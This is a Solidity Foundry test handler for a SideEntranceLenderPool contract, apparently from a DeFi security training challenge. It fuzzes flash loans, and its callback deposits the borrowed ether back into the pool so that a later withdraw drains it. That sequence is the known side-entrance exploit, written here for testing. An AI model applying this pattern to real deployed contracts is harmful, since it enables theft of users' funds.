pragma solidity ^0.8.13;

import {SideEntranceLenderPool} from "../../src/SideEntranceLenderPool.sol";

import "forge-std/Test.sol";

contract Handler is Test {
    // the pool contract
    SideEntranceLenderPool pool;
    
    // used to check if the handler can withdraw ether after the exploit
    bool canWithdraw;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;

        vm.deal(address(this), 10 ether);
    }
    
    // this function will be called by the pool during the flashloan
    function execute() external payable {
        pool.deposit{value: msg.value}();
        canWithdraw = true;
    }
    
    // used for withdrawing ether balance in the pool
    function withdraw() external {
        if (canWithdraw) pool.withdraw();
    }

    // call the flashloan function of the pool, with a fuzzed amount
    function flashLoan(uint amount) external {
        pool.flashLoan(amount);
    }

    receive() external payable {}
}